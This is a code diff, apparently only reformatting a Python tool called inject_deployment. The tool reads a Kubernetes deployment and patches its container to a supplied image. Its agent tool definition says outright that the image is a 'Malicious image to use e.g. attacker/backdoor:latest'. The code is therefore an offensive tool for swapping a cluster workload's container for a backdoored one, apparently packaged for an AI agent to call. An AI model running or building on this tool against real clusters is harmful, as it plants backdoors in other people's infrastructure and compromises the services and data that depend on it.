@@ -10,9 +10,7 @@ def inject_deployment(
     image: str,
 ) -> str:
     try:
-        dep = k8s_apps.read_namespaced_deployment(
-            name=deployment, namespace=namespace
-        )
+        dep = k8s_apps.read_namespaced_deployment(name=deployment, namespace=namespace)
     except ApiException as e:
         if e.status == 404:
             return f"✗ Deployment {namespace}/{deployment} not found."
@@ -20,9 +18,9 @@ def inject_deployment(
             return f"✗ Read access denied on {namespace}/{deployment}."
         return f"Kubernetes API error: {e.status} {e.reason}"
 
-    sa_name        = dep.spec.template.spec.service_account_name or "default"
-    replicas       = dep.spec.replicas or 1
-    target         = dep.spec.template.spec.containers[0]
+    sa_name = dep.spec.template.spec.service_account_name or "default"
+    replicas = dep.spec.replicas or 1
+    target = dep.spec.template.spec.containers[0]
     original_image = target.image
 
     patch = {
@@ -31,7 +29,7 @@ def inject_deployment(
                 "spec": {
                     "containers": [
                         {
-                            "name":  target.name,
+                            "name": target.name,
                             "image": image,
                         }
                     ]
@@ -76,20 +74,11 @@ definition = {
         "parameters": {
             "type": "object",
             "properties": {
-                "deployment": {
-                    "type": "string",
-                    "description": "Deployment name to patch."
-                },
-                "namespace": {
-                    "type": "string",
-                    "description": "Namespace the deployment is in."
-                },
-                "image": {
-                    "type": "string",
-                    "description": "Malicious image to use e.g. attacker/backdoor:latest"
-                },
+                "deployment": {"type": "string", "description": "Deployment name to patch."},
+                "namespace": {"type": "string", "description": "Namespace the deployment is in."},
+                "image": {"type": "string", "description": "Malicious image to use e.g. attacker/backdoor:latest"},
             },
-            "required": ["deployment", "namespace", "image"]
-        }
-    }
+            "required": ["deployment", "namespace", "image"],
+        },
+    },
 }
